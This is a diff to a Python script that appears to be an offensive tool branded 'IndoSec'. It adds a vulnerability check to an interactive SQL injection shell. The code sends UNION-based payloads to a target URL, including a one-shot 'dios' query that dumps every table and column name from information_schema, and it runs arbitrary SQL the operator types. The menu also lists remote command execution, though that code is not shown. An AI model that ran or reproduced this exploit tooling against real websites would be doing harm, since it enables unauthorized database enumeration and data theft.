@@ -1,27 +1,9 @@
 #!/usr/bin/python
 import requests,sys,os,readline,re,binascii
 from urllib.parse import unquote
-from prettytable import PrettyTable
-import pprint
+import time
 
 dios = " (select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x) "
-
-def var_dump(var, prefix=''):
-    """
-    You know you're a php developer when the first thing you ask for
-    when learning a new language is 'Where's var_dump?????'
-    """
-    my_type = '[' + var.__class__.__name__ + '(' + str(len(var)) + ')]:'
-    print(prefix, my_type, sep='')
-    prefix += '    '
-    for i in var:
-        if type(i) in (list, tuple, dict, set):
-            var_dump(i, prefix)
-        else:
-            if isinstance(var, dict):
-                print(prefix, i, ': (', var[i].__class__.__name__, ') ', var[i], sep='')
-            else:
-                print(prefix, '(', i.__class__.__name__, ') ', i, sep='')
 
 def banner():
     print("""
@@ -50,15 +32,33 @@ def menu():
 └[\033[92m•\033[97m] \033[91m4. \033[97mRemote Command Execution
 """)
 
-def execute_sqli(url):
-    r    = requests.get(url.replace("*","CONCAT(0x7b20496e646f536563207d,user(),0x7b20496e646f536563207d)"))
-    user = r.text.split('{ IndoSec }')[1]
+def check_vuln_sqli(url):
+    if re.search("\*", url):
+        r    = requests.get(url.replace("*","CONCAT(0x7b20496e646f536563207d,user(),0x7b20496e646f536563207d)"))
+    else:
+        print("\033[97m[\033[91m-\033[97m] Error Inject Parameter Was Not Found")
+        sys.exit()
+
+    if r.status_code == 404:
+        print("\033[97m[\033[91m-\033[97m] Error, 404 Not Found, Check Your URL")
+        sys.exit(1)
+    else:
+        print("\033[97m[\033[92m+\033[97m] Your target is vulnerabilties")
+        time.sleep(2)
+        print("\033[97m[\033[93m!\033[97m] Trying to connect to your target...")
+        time.sleep(4)
+        print('\033[97m[\033[92m+\033[97m] Connected to your target')
+        execute_sqli(url, r.text.split('{ IndoSec }')[1])
+
+def execute_sqli(url, user):
     try:
         cmd = input("\033[96m┌["+ user +"]\n\033[96m└\033[93m#\033[97m ")
         if cmd == "user":
             option = "user()"
         elif cmd == "dios":
             option = dios
+        elif cmd == "exit":
+            sys.exit()
         else:
             option = cmd
         r      = requests.get(url.replace("*","CONCAT(0x7b20496e646f536563207d,"+ option +",0x7b20496e646f536563207d)"))
@@ -67,21 +67,17 @@ def execute_sqli(url):
             li = output.split("<li>")
             for result in li:
                 print(result)
-            execute_sqli(url)
+            execute_sqli(url,user)
         elif re.search("<br>", output):
             br = output.split("<br>")
-            x = PrettyTable()
-            x.field_names = ["Table", "Column"]
             for result in br:
-                # x.add_row([result.split(" :: ")[0], result.split(" :: ")[1]])
                 print(result)
-            # x.sorby = "Table"
-            execute_sqli(url)
+            execute_sqli(url, user)
         print("\n[+] Output :",output, "\n")
-        execute_sqli(url)
+        execute_sqli(url, user)
     except Exception:
         print("\n[!] Syntax Error\n")
-        execute_sqli(url)
+        execute_sqli(url, user)
 
 def sqli():
     print("[!] Example : http://target.com/parameter.php?id=10'+UNION+SELECT+1,2,3,inject,5-- -")
@@ -92,7 +88,8 @@ def sqli():
         url = unquote(url)
     else:
         url = "http://"+url
-    execute_sqli(url)
+    print("\033[97m[\033[93m!\033[97m] Testing your target...")
+    check_vuln_sqli(url)
 
 banner()
 menu()
